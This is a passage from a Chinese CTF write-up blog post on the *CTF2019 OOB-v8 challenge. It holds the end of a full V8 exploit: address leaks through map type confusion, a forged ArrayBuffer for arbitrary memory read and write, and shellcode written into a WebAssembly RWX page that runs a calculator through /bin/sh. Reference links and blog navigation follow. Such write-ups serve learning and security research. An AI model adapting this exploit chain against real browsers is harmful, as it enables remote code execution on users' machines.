class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arraybuffer = [</span><br><span class="line">	<span class="comment">//map|properties</span></span><br><span class="line">    tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//elements|length</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x1000</span>),</span><br><span class="line">	<span class="comment">//backingstore|0x2</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x2</span>),</span><br><span class="line">	<span class="comment">//padding</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	<span class="comment">//fake map</span></span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x1900042319080808</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x00000000082003ff</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>),</span><br><span class="line">	tC.u2f(<span class="number">0x0</span>)</span><br><span class="line">].slice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>).slice(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> obj = [wasmInstance, fake_arraybuffer, ab].slice(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> buf = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>].slice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">obj_map = tC.f2u(obj.oob());</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*]obj_map addr -&gt; "</span>+hex(obj_map));</span><br><span class="line">buf_map = tC.f2u(buf.oob());</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*]buf_map addr -&gt; "</span>+hex(buf_map));</span><br><span class="line"></span><br><span class="line">obj.oob(tC.u2f(buf_map));		<span class="comment">//将obj数组的map改为double map</span></span><br><span class="line"></span><br><span class="line">wasm_inst_addr = tC.f2u(obj[<span class="number">0</span>]) - <span class="number">1</span>;	<span class="comment">//读取wasm_instance的地址</span></span><br><span class="line">rwx_area_addr = wasm_inst_addr + <span class="number">0x88</span>	<span class="comment">//获取rwx地址的存放地址</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*]RWX_area_addr -&gt; "</span>+hex(rwx_area_addr));</span><br><span class="line"></span><br><span class="line">fake_ab_addr = tC.f2u(obj[<span class="number">1</span>]) - <span class="number">1</span>;		<span class="comment">//读取fake_arraybuffer的地址</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*]fake_ab_addr -&gt; "</span>+hex(fake_ab_addr));</span><br><span class="line">fake_obj_addr = fake_ab_addr - <span class="number">0x80</span>;	<span class="comment">//获取fake_arraybuffer的elements的地址</span></span><br><span class="line">fake_obj_map = fake_ab_addr - <span class="number">0x40</span>;		<span class="comment">//获取伪造的map地址</span></span><br><span class="line"></span><br><span class="line">fake_arraybuffer[<span class="number">0</span>] = tC.u2f(fake_obj_map + <span class="number">1</span>);	<span class="comment">//将伪造的map填入</span></span><br><span class="line">fake_arraybuffer[<span class="number">4</span>] = tC.u2f(rwx_area_addr);		<span class="comment">//将rwx地址的存放地址填入backingStore</span></span><br><span class="line"></span><br><span class="line">obj[<span class="number">2</span>] = tC.u2f(fake_obj_addr + <span class="number">1</span>);	<span class="comment">//将elements地址写入obj数组</span></span><br><span class="line">obj.oob(tC.u2f(obj_map));				<span class="comment">//恢复obj数组的map</span></span><br><span class="line"></span><br><span class="line">fake_obj = <span class="keyword">new</span> <span class="built_in">DataView</span>(obj[<span class="number">2</span>]);		<span class="comment">//将伪造的ArrayBuffer取出</span></span><br><span class="line"></span><br><span class="line">rwx_area = tC.f2u(fake_obj.getFloat64(<span class="number">0</span>, <span class="literal">true</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*]rwx_area -&gt; "</span> + hex(rwx_area));	<span class="comment">//读取rwx空间的地址</span></span><br><span class="line"></span><br><span class="line">fake_arraybuffer[<span class="number">4</span>] = tC.u2f(rwx_area);</span><br><span class="line">shellcode = [<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00];</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    fake_obj.setUint8(i , shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">wasmFunc();</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<p>别人家弹的计算器<br><img src="/2020/04/26/CTF2019-OOB-v8/000.png" alt="000"><br>自己弹的计算器<br><img src="/2020/04/26/CTF2019-OOB-v8/001.png" alt="001"><br>有一说一这个Xcalc还是比gnome-calculator好看一点。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://hpasserby.top/post/825d66e8.html" target="_blank" rel="noopener">*CTF2019 OOB-v8 writeup</a><br><a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/" target="_blank" rel="noopener">star ctf chrome oob writeup</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"># exploit</a>
+          
+            <a href="/tags/Browser/" rel="tag"># Browser</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/21/Issue-821137-OOB-read-write-using-Array-prototype-from/" rel="next" title="Issue 821137: OOB read/write using Array.prototype.from">
+                <i class="fa fa-chevron-left"></i> Issue 821137: OOB read/write using Array.prototype.from
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境准备"><span class="nav-number">1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch分析"><span class="nav-number">2.1.</span> <span class="nav-text">Patch分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#elements后面是什么"><span class="nav-number">2.2.</span> <span class="nav-text">elements后面是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Type-Confusion"><span class="nav-number">2.3.</span> <span class="nav-text">Type Confusion</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#整体思路"><span class="nav-number">3.1.</span> <span class="nav-text">整体思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WASM中RWX地址"><span class="nav-number">3.2.</span> <span class="nav-text">WASM中RWX地址</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
